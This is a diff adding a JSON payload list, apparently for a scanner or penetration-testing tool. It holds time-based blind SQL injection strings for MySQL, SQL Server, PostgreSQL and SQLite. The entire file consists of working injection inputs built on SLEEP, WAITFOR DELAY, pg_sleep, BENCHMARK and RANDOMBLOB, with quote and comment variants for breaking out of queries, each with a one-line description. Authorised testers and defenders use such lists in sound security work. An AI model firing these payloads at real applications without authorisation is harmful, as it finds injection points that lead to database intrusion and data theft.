@@ -1,0 +1,140 @@
+{
+    "payloads": [
+      {
+        "payload": "sleep(5)#",
+        "description": "Injects a delay of 5 seconds using the SLEEP function."
+      },
+      {
+        "payload": "1 or sleep(5)#",
+        "description": "Checks for vulnerability by injecting a condition that always triggers the SLEEP function."
+      },
+      {
+        "payload": "\" or sleep(5)#",
+        "description": "Tests the vulnerability with a quote and the SLEEP function."
+      },
+      {
+        "payload": "' or sleep(5)#",
+        "description": "Another variation with a single quote and the SLEEP function."
+      },
+      {
+        "payload": "1) or sleep(5)#",
+        "description": "Injects a closing parenthesis followed by the SLEEP function."
+      },
+      {
+        "payload": "\") or sleep(5)=\"",
+        "description": "Injects a closing quote, parenthesis, and the SLEEP function."
+      },
+      {
+        "payload": "') or sleep(5)='",
+        "description": "Injects a closing parenthesis and a condition with the SLEEP function."
+      },
+      {
+        "payload": ";waitfor delay '0:0:5'--",
+        "description": "Injects a delay of 5 seconds using SQL Server's WAITFOR DELAY command."
+      },
+      {
+        "payload": ");waitfor delay '0:0:5'--",
+        "description": "Injects a closing parenthesis and a delay of 5 seconds."
+      },
+      {
+        "payload": "';waitfor delay '0:0:5'--",
+        "description": "Injects a single quote and a delay of 5 seconds."
+      },
+      {
+        "payload": "\";waitfor delay '0:0:5'--",
+        "description": "Injects a double quote and a delay of 5 seconds."
+      },
+      {
+        "payload": "benchmark(10000000,MD5(1))#",
+        "description": "Uses the benchmark function to induce a time delay by performing an expensive operation."
+      },
+      {
+        "payload": "1 or benchmark(10000000,MD5(1))#",
+        "description": "Injects a benchmark function to induce a delay of 10 million iterations."
+      },
+      {
+        "payload": "' or benchmark(10000000,MD5(1))#",
+        "description": "Injects a benchmark function with a string input to induce a delay."
+      },
+      {
+        "payload": "pg_sleep(5)--",
+        "description": "Injects a PostgreSQL-specific time delay using the pg_sleep function."
+      },
+      {
+        "payload": "1 or pg_sleep(5)--",
+        "description": "Checks for vulnerability by triggering the pg_sleep function."
+      },
+      {
+        "payload": "' or pg_sleep(5)--",
+        "description": "Injects the pg_sleep function with a string condition."
+      },
+      {
+        "payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
+        "description": "Uses a nested SELECT statement with SLEEP to check for a time delay vulnerability."
+      },
+      {
+        "payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
+        "description": "Another variation of nested SELECT statement with SLEEP function."
+      },
+      {
+        "payload": "SLEEP(5)#",
+        "description": "Directly injects the SLEEP function to induce a time-based delay."
+      },
+      {
+        "payload": "SLEEP(5)--",
+        "description": "Uses the SLEEP function with a comment to bypass the rest of the query."
+      },
+      {
+        "payload": "SLEEP(5)=\"",
+        "description": "Injects the SLEEP function and tries to close the query with a double quote."
+      },
+      {
+        "payload": "SLEEP(5)='",
+        "description": "Injects the SLEEP function with a single quote to close the query."
+      },
+      {
+        "payload": "waitfor delay '00:00:05'",
+        "description": "Injects a delay using SQL Server's WAITFOR DELAY function."
+      },
+      {
+        "payload": "benchmark(50000000,MD5(1))",
+        "description": "Performs an expensive operation to test for time-based SQL injection."
+      },
+      {
+        "payload": "pg_SLEEP(5)--",
+        "description": "Injects the pg_sleep function to induce a delay in PostgreSQL."
+      },
+      {
+        "payload": "AnD SLEEP(5)",
+        "description": "Injects an AND condition with the SLEEP function."
+      },
+      {
+        "payload": "AnD SLEEP(5)--",
+        "description": "Injects an AND condition with a SLEEP function and a comment to bypass the query."
+      },
+      {
+        "payload": "ORDER BY SLEEP(5)",
+        "description": "Injects the ORDER BY clause with the SLEEP function to test for time delays."
+      },
+      {
+        "payload": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)",
+        "description": "Injects a nested SELECT statement with the SLEEP function."
+      },
+      {
+        "payload": "+SLEEP(10)+",
+        "description": "Injects a delay using the SLEEP function with an addition operator."
+      },
+      {
+        "payload": "RANDOMBLOB(500000000/2)",
+        "description": "Injects a large random blob to induce a time delay."
+      },
+      {
+        "payload": "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
+        "description": "Tests for a time delay using RANDOMBLOB and LIKE operator."
+      },
+      {
+        "payload": "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
+        "description": "Tests for a time delay using RANDOMBLOB and LIKE operator with OR condition."
+      }
+    ]
+  }
